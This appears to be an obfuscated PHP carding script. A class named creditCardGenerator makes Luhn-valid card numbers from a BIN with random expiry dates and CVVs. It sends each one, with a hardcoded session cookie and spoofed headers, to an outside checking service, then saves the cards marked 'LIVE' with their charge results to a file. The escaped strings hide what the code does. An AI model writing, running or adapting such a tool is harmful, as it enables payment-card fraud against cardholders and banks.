<?php
 class creditCardGenerator { protected $bin; protected $message; protected $much; protected $check; public function color($color = "\144\145\x66\x61\x75\x6c\164", $text) { $arrayColor = array("\147\162\145\171" => "\x31\73\63\x30", "\162\x65\x64" => "\61\x3b\63\x31", "\147\x72\x65\x65\156" => "\x31\x3b\63\62", "\171\145\x6c\x6c\x6f\x77" => "\x31\x3b\x33\x33", "\142\x6c\165\145" => "\61\73\x33\64", "\x70\165\x72\160\154\145" => "\x31\73\x33\65", "\x6e\x65\x76\171" => "\61\73\63\x36", "\x77\150\x69\164\145" => "\61\73\x30"); return "\33\133" . $arrayColor[$color] . "\155" . $text . "\x1b\133\x30\155"; } public function __construct($bin, $much, $check) { $this->bin = $bin; $this->check = $check; if (is_numeric($check)) { $this->check = $check; } else { echo $this->color("\x72\145\144", "\173\x21\175\x20\x43\x68\145\x63\x6b\40\x6d\165\163\164\40\142\157\x6f\154\145\x61\156\12"); } if (is_numeric($much)) { $this->much = $much; } else { echo $this->color("\162\x65\x64", "\173\x21\x7d\x20\x54\157\164\x61\154\40\x6d\165\163\x74\40\x62\x65\40\x6e\x75\155\145\162\151\143\x21\xa"); die(1); } } protected function Save($title, $text) { $fopen = fopen($title, "\x61"); fwrite($fopen, $text); fclose($fopen); } protected function Check($card) { $ch = curl_init(); $postData = http_build_query(array("\x61\152\141\170" => 1, "\144\157" => "\143\x68\x65\x63\153", "\143\143\154\x69\x73\x74" => $card)); $headers = array(); $headers[] = "\103\x6f\157\153\x69\145\x3a\x20\x5f\x67\141\x3d\x47\101\x31\x2e\x32\56\x32\60\63\61\71\60\x33\x32\66\x34\x2e\x31\x35\x35\x35\63\x35\63\63\61\64\73\x20\x66\x63\75\45\x37\102\x25\62\x32\x4e\x44\x49\60\x66\155\106\x73\x59\155\x56\154\131\x6d\x46\151\145\x53\65\x6a\x62\x32\x30\45\x32\62\45\x33\x41\x25\62\62\x31\x25\63\x41\61\65\x35\65\63\x35\x33\x33\x32\x30\x36\65\x38\45\x32\62\45\62\103\x25\x32\x32\116\104\x49\x30\x66\x6d\106\x31\144\107\x39\x6e\143\x6d\106\167\x61\x47\x4a\x31\145\x53\x35\152\142\x32\60\x25\62\62\45\63\101\45\62\62\61\x25\x33\101\61\65\x35\65\x33\x35\x33\x33\x32\60\66\x39\x34\x25\x32\x32\x25\62\x43\45\x32\62\116\104\111\x30\x66\155\x70\152\x63\x47\126\x75\x62\x6d\126\x35\114\155\116\166\x62\121\x25\62\x32\x25\63\x41\45\62\x32\62\x25\63\101\61\65\65\x35\63\65\63\63\64\61\71\63\x31\45\x32\x32\45\x37\x44\x3b\x20\160\x76\75\x25\67\102\45\x32\x32\141\45\x32\62\45\x33\x41\x25\x32\x32\61\x25\63\101\61\65\65\x35\x33\65\x33\x33\62\60\x36\x36\x36\45\62\62\45\x32\103\x25\62\62\157\x25\62\x32\45\x33\101\45\62\x32\61\45\x33\x41\x31\65\x35\65\63\x35\x33\63\x32\x30\67\60\60\45\62\62\45\x32\103\45\x32\x32\x64\x25\x32\62\x25\x33\101\45\x32\x32\x32\x25\63\x41\x31\65\x35\65\x33\x35\63\63\x34\x31\x39\63\65\x25\62\x32\45\67\104\73\x20\x50\110\x50\x53\x45\x53\x53\x49\x44\75\160\147\155\67\163\154\x33\x75\x72\64\143\155\x70\64\x38\x61\163\153\141\x35\x6e\x39\61\154\157\x33"; $headers[] = "\x4f\162\x69\147\x69\156\72\x20\150\164\x74\x70\x73\72\x2f\57\x6d\x72\143\150\145\x63\x6b\145\x72\x2e\156\145\164"; $headers[] = "\101\143\x63\145\x70\x74\55\114\141\x6e\147\x75\x61\147\145\72\40\145\x6e\55\125\123\54\x65\x6e\73\161\x3d\x30\x2e\71"; $headers[] = "\x55\163\x65\x72\55\x41\147\x65\156\164\x3a\40\115\157\172\x69\154\x6c\141\x2f\65\x2e\60\40\50\127\151\156\144\157\167\x73\40\x4e\x54\x20\x36\56\x31\x3b\40\x57\151\156\66\64\73\40\170\66\x34\x29\40\101\160\160\154\145\x57\x65\x62\113\151\164\57\x35\63\67\x2e\x33\x36\x20\50\x4b\x48\124\x4d\x4c\54\x20\x6c\x69\x6b\145\40\x47\145\143\153\157\51\x20\103\150\162\x6f\155\x65\57\67\63\x2e\x30\56\x33\x36\70\63\56\x31\60\x33\40\x53\x61\146\x61\162\x69\57\x35\63\67\x2e\x33\x36"; $headers[] = "\x43\157\x6e\164\145\156\x74\55\x54\x79\160\x65\x3a\x20\x61\x70\x70\x6c\x69\143\141\x74\151\157\156\x2f\x78\x2d\167\167\167\x2d\x66\x6f\162\155\x2d\165\162\154\145\156\x63\157\x64\145\x64\x3b\x20\143\150\141\x72\x73\145\164\x3d\x55\124\x46\55\70"; $headers[] = "\101\143\143\145\x70\x74\72\40\141\160\x70\x6c\151\x63\141\164\151\x6f\x6e\57\152\x73\x6f\156\x2c\x20\x74\145\x78\x74\57\x6a\x61\166\141\163\x63\162\x69\160\x74\x2c\x20\52\x2f\52\73\40\x71\75\60\x2e\60\x31"; $headers[] = "\x52\x65\146\145\x72\x65\162\72\x20\150\164\x74\x70\163\72\57\x2f\x6d\x72\143\x68\x65\143\x6b\145\162\x2e\x6e\145\x74\x2f\143\x61\162\144\57\x63\143\x6e\x33\57"; $headers[] = "\130\55\122\145\161\165\145\x73\164\145\x64\55\127\151\164\x68\x3a\40\x58\115\114\110\164\164\x70\x52\145\x71\x75\145\163\x74"; $headers[] = "\103\x6f\156\x6e\x65\x63\x74\151\x6f\156\x3a\40\x6b\145\x65\160\x2d\141\154\x69\x76\145"; $options = array(CURLOPT_URL => "\150\x74\164\x70\x73\x3a\x2f\57\x6d\x72\x63\150\x65\143\x6b\145\162\x2e\x6e\x65\x74\x2f\143\141\x72\x64\57\143\143\156\63\x2f\141\x6c\x69\x65\156\x30\x37\x2e\x70\150\x70", CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $postData, CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => true); curl_setopt_array($ch, $options); $exec = curl_exec($ch); return $exec; } public function getCC() { if ($this->bin <= 0 || !isset($this->bin)) { $message[0] = "\x53\x65\164\x20\x62\151\x6e\40\146\x69\162\163\164"; echo $this->color("\x79\x65\154\154\157\167", $message); } else { if ($this->bin > 9999999999999999) { $message[0] = "\102\x69\156\x20\164\157\40\154\x6f\156\x67"; echo $this->color("\171\145\x6c\x6c\x6f\x77", $message); } else { $output = $this->ccNumber($this->bin, 16, $this->much); return $output; } } } protected function generateYears() { $randDate = rand(1, 30); $randYears = rand(20, 25); $randCvv = rand(8, 800); $randDate < 10 ? $randDate = "\x30" . $randDate : ($randDate = $randDate); $randCvv < 100 ? $randCvv = "\60" . $randCvv : ($randCvv = $randCvv); return "\174" . $randDate . "\174\62\60" . $randYears . "\x7c" . $randCvv; } protected function completedNumber($prefix, $length) { $ccnumber = $this->bin; while (strlen($ccnumber) < $length - 1) { $ccnumber .= rand(0, 9); } $sum = 0; $pos = 0; $reversedCCnumber = strrev($ccnumber); while ($pos < $length - 1) { $odd = $reversedCCnumber[$pos] * 2; if ($odd > 9) { $odd -= 9; } $sum += $odd; if ($pos != $length - 2) { $sum += $reversedCCnumber[$pos + 1]; } $pos += 2; } $checkdigit = ((floor($sum / 10) + 1) * 10 - $sum) % 10; $ccnumber .= $checkdigit; return $ccnumber; } protected function ccNumber($prefixList, $length, $howMany) { for ($i = 0; $i < $howMany; $i++) { if ($this->check == true) { $card = $this->completedNumber($this->bin, $length) . $this->generateYears(); $check = json_decode($this->Check($card)); if ($check->error == 0) { preg_match_all("\x23\74\x66\157\156\x74\x20\x63\157\x6c\157\x72\x3d\147\x72\145\145\x6e\76\50\x2e\52\77\x29\74\57\146\157\x6e\164\x3e\x23\x73\x69", $check->msg, $charge); echo $card . $this->color("\147\x72\x65\x65\x6e", "\x20\x3e\76\40\114\x49\x56\105\x20\x5b\40\103\150\141\x72\147\145\40\x3a\40" . $charge[1][1] . "\40\135\12"); $this->Save("\122\x65\163\x75\x6c\x74\x2d" . $this->bin . "\56\164\170\164", $card . "\x20\x7c\40" . $charge[1][1] . "\xa"); } else { if ($check->error == 2) { echo $card . $this->color("\x72\145\144", "\x20\x3e\76\40\104\111\x45\xa"); } else { echo $card . $this->color("\x67\x72\145\171", "\40\76\x3e\x20\125\x4e\113\x4e\117\127\116\12"); } } } else { echo $this->completedNumber($this->bin, $length) . $this->generateYears() . "\12"; } } } }
